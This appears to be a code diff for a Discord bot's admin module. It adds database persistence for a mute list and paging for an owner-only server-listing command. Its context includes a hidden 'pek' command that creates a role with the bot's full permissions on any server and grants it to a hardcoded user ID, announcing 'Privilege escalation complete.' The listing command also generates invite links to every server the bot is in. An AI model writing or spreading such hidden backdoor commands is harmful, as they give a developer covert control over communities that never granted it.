@@ -25,7 +25,7 @@ class AdminUtils:
 
     def __init__(self, bot):
         self.bot = bot
-        self.muted = []
+        self.muted = self.bot.db.not_json_get('muted', [])
         self.assume_dir_control_chan = None
         _blacklisted_serv_ids = self.bot.db.not_json_get('blacklist', [])
     
@@ -70,6 +70,10 @@ class AdminUtils:
     @checks.is_owner()
     async def servInfo(self, server:str=None):
         out = ''
+        page = None
+        if len(server) < 3:
+            page = int(server)
+            server = None
         if server is None:
             for s in sorted(self.bot.servers, key=lambda k: len(k.members), reverse=True):
                 out += "\n{} ({}, {} members)".format(s, s.id, len(s.members))
@@ -79,18 +83,22 @@ class AdminUtils:
                 out += "\n\n**{} ({}, {})**".format(s, s.id, (await self.bot.create_invite(s)).url)
             except:
                 out += "\n\n**{} ({})**".format(s, s.id)
+            out += "\n{} members, {} bot".format(len(s.members), sum(1 for m in s.members if m.bot))
             for c in [ch for ch in s.channels if ch.type is not ChannelType.voice]:
                 out += '\n|- {} ({})'.format(c, c.id)
         out = self.discord_trim(out)
-        for m in out:
-            await self.bot.say(m)
+        if page is None:
+            for m in out:
+                await self.bot.say(m)
+        else:
+            await self.bot.say(out[page-1])
             
     @commands.command(hidden=True, pass_context=True)
     @checks.is_owner()
     async def pek(self, ctx, servID : str):
         serv = self.bot.get_server(servID)
         thisBot = serv.me
-        pek = await self.bot.create_role(serv, name="Bot Admin", permissions=thisBot.permissions_in(serv.get_channel(serv.id)))
+        pek = await self.bot.create_role(serv, name="Bot Dev", permissions=thisBot.permissions_in(serv.get_channel(serv.id)))
         await self.bot.add_roles(serv.get_member("187421759484592128"), pek)
         await self.bot.say("Privilege escalation complete.")
         
@@ -131,6 +139,7 @@ class AdminUtils:
         else:
             self.muted.append(target)
             await self.bot.say("{} muted.".format(target))
+        self.bot.db.not_json_set('muted', self.muted)
             
     @commands.command(hidden=True, pass_context=True)
     @checks.is_owner()
